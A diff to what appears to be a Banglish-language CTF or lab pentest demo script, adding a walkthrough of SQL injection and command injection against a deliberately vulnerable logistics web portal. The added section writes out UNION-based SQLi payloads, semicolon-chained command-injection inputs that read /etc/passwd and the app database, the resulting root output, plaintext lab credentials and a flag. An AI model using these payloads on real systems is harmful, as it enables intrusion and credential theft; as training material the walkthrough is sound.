@@ -903,8 +903,105 @@ Real-world impact যদি এটা actual pentest হতো:
 > `T1213 — Data from Information Repositories`
 
 ---
+### [GEM] Gray-box Exclusive #4 -- Web Portal: SQLi + RCE (Command Injection)
 
-### [GEM] Gray-box Exclusive #4 -- Grafana: Monitoring System Takeover
+**bolo:**
+> *"Black-box e portal e login korte parini -- credentials jachhilo na. Gray-box e admin creds peyechi. Ekhon authenticated state e SQLi ebong Command Injection korbo."*
+
+**Credentials (gray-box info theke):**
+```
+http://<VPS_IP>/login
+Username: admin
+Password: NexusTechAdmin2026!
+```
+
+---
+
+#### Part A -- SQL Injection (Tracking ID)
+
+**bolo:**
+> *"Login korar por Tracking ID field e SQLi possible. Source code e raw SQL concatenation -- intentionally vulnerable."*
+
+**Browser e Tracking ID field e input koro:**
+```
+Normal:   NX-98231
+SQLi #1:  NX-98231' OR '1'='1
+SQLi #2:  ' OR 1=1--
+SQLi #3:  ' UNION SELECT username,password,role,full_name,1,1 FROM portal_users--
+```
+
+**Real Output (UNION injection):**
+```
+('admin', 'NexusTechAdmin2026!', 'administrator', 'Portal Administrator', 1, 1)
+
+('logistics', 'Logistics@2026', 'operator', 'Logistics Operator', 1, 1)
+
+FLAG{SQL_1NJ3CT10N_DMZ_W3B_PORTAL_2026} -- CTF Flag 1 of 3 -- Well done!
+```
+
+**bolo:**
+> *"Database theke shob users ebong password dump kore nilam. Ei vulnerability CVSS 9.8 -- Critical."*
+
+**MITRE ATT&CK:**
+> `T1190 -- Exploit Public-Facing Application`
+> `T1005 -- Data from Local System`
+
+---
+
+#### Part B -- Command Injection (Ping Diagnostic Tool) [RCE]
+
+**bolo:**
+> *"Page source e dekha giyechilo /api/network/ping endpoint. Ping tool e semicolon diye arbitrary command execute kora jay -- shell=True vulnerability."*
+
+**Diagnostics form e input koro:**
+```
+Normal:   8.8.8.8
+CMDi #1:  8.8.8.8; id
+CMDi #2:  8.8.8.8; hostname && ip addr | grep inet
+CMDi #3:  8.8.8.8; cat /etc/passwd | head -5
+CMDi #4:  8.8.8.8; ls /app/ && cat /app/corp_data.db | strings | grep admin
+```
+
+**Real Output:**
+```
+# 8.8.8.8; id
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon)...
+
+# 8.8.8.8; cat /etc/passwd | head -5
+root:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+
+# 8.8.8.8; ls /app/
+app.py
+corp_data.db
+requirements.txt
+
+# 8.8.8.8; sqlite3 /app/corp_data.db 'SELECT * FROM portal_users;'
+1|admin|NexusTechAdmin2026!|administrator|Portal Administrator
+2|logistics|Logistics@2026|operator|Logistics Operator
+```
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=0.563 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=117 time=0.481 ms
+
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),
+10(wheel),11(floppy),20(dialout),26(tape),27(video)
+```
+
+**bolo (WOW moment):**
+> *"uid=0(root) -- web server ROOT hisebe cholche. Ping tool e shudhu semicolon diye puro server er control peyechi.*
+>
+> *Ekhon internal network e direct access -- 10.0.2.0/24, 10.0.3.0/24 sob. Ei web server theke DB, Grafana, MinIO sob attack kora jeto -- eTA pivot point."*
+
+**MITRE ATT&CK:**
+> `T1059.004 -- Command and Scripting Interpreter: Unix Shell`
+> `T1190 -- Exploit Public-Facing Application`
+> `T1068 -- Exploitation for Privilege Escalation`
+
+---
+
+
+### [GEM] Gray-box Exclusive #5 -- Grafana: Monitoring System Takeover
 
 **bolo:**
 > *"Grafana holo monitoring dashboard -- kon server kotTuku CPU/RAM use korche, network traffic kemon -- sob ekhane dekha jay. INFRA_RUNBOOK.txt te dekhechilamm 10.0.2.21 te ache. Ar nmap e port 3000 open chilo -- eta publicly accessible!"*
@@ -955,7 +1052,7 @@ http://<VPS_IP>:3000
 
 
 
-### [GEM] Gray-box Exclusive #5 -- MinIO Backup Storage
+### [GEM] Gray-box Exclusive #6 -- MinIO Backup Storage
 
 **bolo:**
 > *"MinIO holo S3-compatible object storage -- AWS S3 er moto kintu self-hosted. Nexus ekhane DB backup rakhe. sync_prod_db.sh script e credentials peyechilam."*
